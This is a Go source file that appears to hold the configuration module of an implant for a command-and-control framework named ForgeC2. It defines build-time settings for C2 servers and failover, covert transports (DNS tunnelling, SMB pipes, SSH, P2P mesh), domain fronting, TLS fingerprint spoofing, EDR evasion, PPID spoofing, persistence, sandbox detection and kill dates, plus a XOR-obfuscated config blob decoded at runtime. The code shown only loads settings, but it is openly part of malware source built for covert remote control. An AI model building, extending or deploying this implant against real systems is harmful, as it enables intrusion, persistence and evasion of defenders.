//go:build linux || windows || darwin
// +build linux windows darwin

package main

import (
	"encoding/json"
	"time"
)

// These variables are injected at compile time via -ldflags "-X main.C2URL=..."
// This source is used exclusively by the Generate Agent flow (EXE).
// IMPORTANT: -X can ONLY set string variables. Non-strings are injected as *Str and parsed in init().
var (
	C2URL                string   = s(SC2DefaultURL)
	C2URLs               []string // parsed from C2URL (comma-separated multi-C2 failover)
	currentC2Idx         int      // index of last working C2 server
	IntervalStr          string   = "10"
	JitterStr            string   = "20"
	UserAgent            string   = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
	PersistStr           string   = "false"
	SkipTLSVerifyStr     string   = "false" // default secure; change to "true" for self-signed C2 certs
	Protocol             string   = "http"  // "http" or "tcp" injected via ldflags
	DebugStr             string   = "false" // set via ldflags for debug builds (stealth default false)
	FastInterval         int      = 1       // Fast interval for screen monitoring (1 second)
	BeaconURIStr         string   = s(SBeaconURI)
	BeaconMethodStr      string   = s(SBeaconMethod)
	ListenerIDStr        string   = "0"
	P2PMode              string   = ""                            // "", "smb", "tcp"
	P2PParent            string   = ""                            // parent agent to connect to (child mode)
	P2PListenAddr        string   = ""                            // listen addr for children (parent mode)
	DNSDomain            string   = ""                            // DNS C2 domain (e.g. "c2.example.com")
	DNSServer            string   = ""                            // DNS C2 server IP
	DNSDoHURL            string   = ""                            // DNS-over-HTTPS endpoint (e.g. "https://dns.google/dns-query")
	DNSDoTAddr           string   = ""                            // DNS-over-TLS address:port (e.g. "1.1.1.1:853")
	DNSIPv6              bool     = false                         // enable IPv6 AAAA record tunneling
	ProxyStr             string   = ""                            // HTTP proxy URL (e.g. "http://proxy:8080")
	CryptoKeyStr         string   = ""                            // 32-byte hex key for beacon payload encryption ("" = disabled)
	BeaconKeyStr         string   = ""                            // pre-shared key used to derive registration auth ("" = no PSK auth)
	RegSecretIDStr       string   = ""                            // v3: per-implant registration secret id ("" = v2 master-key derivation)
	RegSecretStr         string   = ""                            // v3: per-implant registration secret, base64 ("" = v2 master-key derivation)
	DomainFront          string   = ""                            // Domain fronting: override HTTP Host header ("" = disabled)
	ContentLengthJitter  int      = 0                             // Max random padding bytes for HTTP body (0=disabled)
	MalleablePrepend     string   = ""                            // bytes prepended to every HTTP beacon response body (server malleable profile)
	MalleableAppend      string   = ""                            // bytes appended to every HTTP beacon response body (server malleable profile)
	ExpiryDateStr        string   = ""                            // Compile-time expiry date: "YYYY-MM-DD" — implant auto-exits after this date
	EvasionStr           string   = "false"                       // Compile-time EDR evasion (chunked sleep); also FORGEC2_EVASION=1 at runtime
	PPIDSpoofStr         string   = "false"                       // Compile-time PPID spoofing (spawned processes inherit explorer.exe as parent)
	PersistencePrefixStr string   = ""                            // Custom prefix for persistence artifacts (reg keys, task names, file names); default "ForgeC2"
	BeaconTransportStr   string   = "http"                        // "http", "wss", "ssh" — transport protocol for beacon
	ChameleonStr         string   = "true"                        // enable uTLS TLS fingerprint randomization (requires chameleon build tag)
	ChameleonProfileStr  string   = "random"                      // chrome, firefox, ios, android, random
	SMBPipeName          string   = "forgec2"                     // named pipe name for SMB transport
	IsSMBParentStr       string   = "false"                       // "true" = this agent is an SMB parent (listens on pipe)
	SSHUserStr           string   = "forgec2"                     // SSH username for SSH transport
	SSHPasswordStr       string   = ""                            // SSH password for SSH transport
	SSHKeyStr            string   = ""                            // base64-encoded PEM private key for SSH transport
	SSHHostKeyStr        string   = ""                            // base64 server host public key (pin); empty = SSH transport refuses to connect
	EgressDetectionStr   string   = "false"                       // enable egress detection on startup
	EgressPortsStr       string   = "80,443,8080,8443,53,22,2222" // ports to test for egress

	// Certificate pinning (SHA-256 hex of server DER cert; empty = disabled)
	PinnedCertSHA256Str string = ""

	// mTLS transport
	MTLSCertStr string = "" // base64-encoded client certificate PEM for mTLS
	MTLSKeyStr  string = "" // base64-encoded client key PEM for mTLS
	MTLSCAStr   string = "" // base64-encoded CA certificate PEM for mTLS

	// WireGuard-style transport
	WGPrivateKeyStr   string = "" // base64-encoded 32-byte private key
	WGServerPublicStr string = "" // base64-encoded 32-byte server public key

	// Multi-C2 traffic splitting and failover
	C2ModeStr      string = s(SC2Mode) // "single", "failover", "roundrobin", "random", "split", "parallel"
	MaxRetriesStr  string = "10"       // max retries before entering dead mode
	DeadTimeoutStr string = "3600"     // seconds to wait before retrying dead C2s

	// P2P Mesh / Gossip Discovery
	GossipEnabledStr  string = "false" // enable gossip peer discovery
	GossipIntervalStr string = "30"    // seconds between gossip probes
	GossipListenAddr  string = ""      // gossip listen addr (defaults to P2PListenAddr+1)

	// Working Hours
	WorkingStartStr string = "" // HH:MM start of working hours (empty = disabled)
	WorkingEndStr   string = "" // HH:MM end of working hours (empty = disabled)
	WorkingTZStr    string = "" // IANA timezone (empty = UTC)

	// Per-Agent Kill Date
	KillDateStr string = "" // YYYY-MM-DD — agent self-destructs after this date (empty = disabled)

	// Binary integrity verification (SHA-256 hex of the running binary; empty = disabled)
	SelfCheckSHA256Str string = ""

	// ConfigBlob is the XOR-obfuscated runtime configuration block injected via
	// -ldflags "-X main.ConfigBlob=...". The agent decodes it during init() and
	// reapplies it over the build-time defaults above. Empty = use defaults only
	// (direct `go build` of the agent source without the Generate pipeline).
	ConfigBlob string = ""
)

// Parsed versions (populated in init)
var (
	Interval         int
	Jitter           int
	Persist          bool
	SkipTLSVerify    bool
	Debug            bool
	BeaconURI        string
	BeaconMethod     string
	ListenerID       uint
	BeaconTransport  string
	evasionEnabled   bool
	chameleonEnabled bool
	chameleonProfile string
	isSMBParent      bool
	smbPipeName      string // resolved SMB pipe name (from SMBPipeName or extracted from C2URL)
)

var beaconCipher *streamCipher // legacy XOR beacon encryption (nil = disabled)
var ecdhSess *ecdhSession      // ECDH session for forward-secret encryption (nil = not established)
var beaconKey string           // parsed from BeaconKeyStr (PSK auth on all transports)
var inSandbox bool             // set by sandbox detection at startup
var ppidSpoofEnabled bool      // PPID spoofing enabled via ldfags
var persistencePrefix string   // artifact name prefix for persistence (default "ForgeC2")
var egressDetection bool       // parsed from EgressDetectionStr
var AgentVersion = s(SAgentVersion)
var maxRetries int             // parsed from MaxRetriesStr
var deadTimeout time.Duration  // parsed from DeadTimeoutStr
var dnsConsecutiveFailures int // DNS beacon consecutive failure count
const dnsFallbackThreshold = 5 // fallback to HTTP after this many DNS failures

// Working hours runtime state
var (
	workingStart string // HH:MM start (from WorkingStartStr)
	workingEnd   string // HH:MM end (from WorkingEndStr)
	workingTZ    string // IANA timezone (from WorkingTZStr)
)

// Kill date runtime state
var killDateParsed time.Time // parsed from KillDateStr

// agentConfigBlob mirrors the config keys produced by the server's
// payload.buildConfigBlob. Empty values are ignored so injected config only
// overrides non-default values and build-time defaults otherwise stand.
type agentConfigBlob struct {
	C2URL            string `json:"c2_url"`
	Interval         string `json:"interval"`
	Jitter           string `json:"jitter"`
	UserAgent        string `json:"user_agent"`
	Persist          string `json:"persist"`
	SkipTLSVerify    string `json:"skip_tls"`
	Protocol         string `json:"protocol"`
	Debug            string `json:"debug"`
	BeaconURI        string `json:"beacon_uri"`
	BeaconMethod     string `json:"beacon_method"`
	ListenerID       string `json:"listener_id"`
	P2PMode          string `json:"p2p_mode"`
	P2PParent        string `json:"p2p_parent"`
	P2PListenAddr    string `json:"p2p_listen"`
	DNSDomain        string `json:"dns_domain"`
	DNSServer        string `json:"dns_server"`
	DNSDoHURL        string `json:"dns_doh"`
	DNSDoTAddr       string `json:"dns_dot"`
	Proxy            string `json:"proxy"`
	CryptoKey        string `json:"crypto_key"`
	BeaconKey        string `json:"beacon_key"`
	RegSecretID      string `json:"reg_secret_id"`
	RegSecret        string `json:"reg_secret"`
	ExpiryDate       string `json:"expiry"`
	Evasion          string `json:"evasion"`
	DomainFront      string `json:"domain_front"`
	WorkingStart     string `json:"work_start"`
	WorkingEnd       string `json:"work_end"`
	WorkingTZ        string `json:"work_tz"`
	BeaconTransport  string `json:"beacon_transport"`
	SSHUser          string `json:"ssh_user"`
	SSHPassword      string `json:"ssh_password"`
	SSHKey           string `json:"ssh_key"`
	SSHHostKey       string `json:"ssh_host_key"`
	PinnedCertSHA256 string `json:"pinned_cert"`
	SelfCheckSHA256  string `json:"self_check"`
	MalleablePrepend string `json:"malleable_prepend"`
	MalleableAppend  string `json:"malleable_append"`
}

// loadConfigBlob decodes the injected runtime config block and reapplies it over
// the compile-time defaults. It must be called before config values are parsed.
func loadConfigBlob() {
	if ConfigBlob == "" {
		return
	}
	plain := mustDecrypt(ConfigBlob)
	if plain == "" {
		logDebug("[config] blob empty after decode, using build-time defaults")
		return
	}
	var b agentConfigBlob
	if err := json.Unmarshal([]byte(plain), &b); err != nil {
		logDebug("[config] blob unmarshal failed, using build-time defaults")
		return
	}
	b.apply()
}

func (b *agentConfigBlob) apply() {
	if b.C2URL != "" {
		C2URL = b.C2URL
	}
	if b.Interval != "" {
		IntervalStr = b.Interval
	}
	if b.Jitter != "" {
		JitterStr = b.Jitter
	}
	if b.UserAgent != "" {
		UserAgent = b.UserAgent
	}
	if b.Persist != "" {
		PersistStr = b.Persist
	}
	if b.SkipTLSVerify != "" {
		SkipTLSVerifyStr = b.SkipTLSVerify
	}
	if b.Protocol != "" {
		Protocol = b.Protocol
	}
	if b.Debug != "" {
		DebugStr = b.Debug
	}
	if b.BeaconURI != "" {
		BeaconURIStr = b.BeaconURI
	}
	if b.BeaconMethod != "" {
		BeaconMethodStr = b.BeaconMethod
	}
	if b.ListenerID != "" {
		ListenerIDStr = b.ListenerID
	}
	if b.P2PMode != "" {
		P2PMode = b.P2PMode
	}
	if b.P2PParent != "" {
		P2PParent = b.P2PParent
	}
	if b.P2PListenAddr != "" {
		P2PListenAddr = b.P2PListenAddr
	}
	if b.DNSDomain != "" {
		DNSDomain = b.DNSDomain
	}
	if b.DNSServer != "" {
		DNSServer = b.DNSServer
	}
	if b.DNSDoHURL != "" {
		DNSDoHURL = b.DNSDoHURL
	}
	if b.DNSDoTAddr != "" {
		DNSDoTAddr = b.DNSDoTAddr
	}
	if b.Proxy != "" {
		ProxyStr = b.Proxy
	}
	if b.CryptoKey != "" {
		CryptoKeyStr = b.CryptoKey
	}
	if b.BeaconKey != "" {
		BeaconKeyStr = b.BeaconKey
	}
	if b.RegSecretID != "" {
		RegSecretIDStr = b.RegSecretID
	}
	if b.RegSecret != "" {
		RegSecretStr = b.RegSecret
	}
	if b.ExpiryDate != "" {
		ExpiryDateStr = b.ExpiryDate
	}
	if b.Evasion != "" {
		EvasionStr = b.Evasion
	}
	if b.DomainFront != "" {
		DomainFront = b.DomainFront
	}
	if b.WorkingStart != "" {
		WorkingStartStr = b.WorkingStart
	}
	if b.WorkingEnd != "" {
		WorkingEndStr = b.WorkingEnd
	}
	if b.WorkingTZ != "" {
		WorkingTZStr = b.WorkingTZ
	}
	if b.BeaconTransport != "" {
		BeaconTransportStr = b.BeaconTransport
	}
	if b.SSHUser != "" {
		SSHUserStr = b.SSHUser
	}
	if b.SSHPassword != "" {
		SSHPasswordStr = b.SSHPassword
	}
	if b.SSHKey != "" {
		SSHKeyStr = b.SSHKey
	}
	if b.SSHHostKey != "" {
		SSHHostKeyStr = b.SSHHostKey
	}
	if b.PinnedCertSHA256 != "" {
		PinnedCertSHA256Str = b.PinnedCertSHA256
	}
	if b.SelfCheckSHA256 != "" {
		SelfCheckSHA256Str = b.SelfCheckSHA256
	}
	if b.MalleablePrepend != "" {
		MalleablePrepend = b.MalleablePrepend
	}
	if b.MalleableAppend != "" {
		MalleableAppend = b.MalleableAppend
	}
}
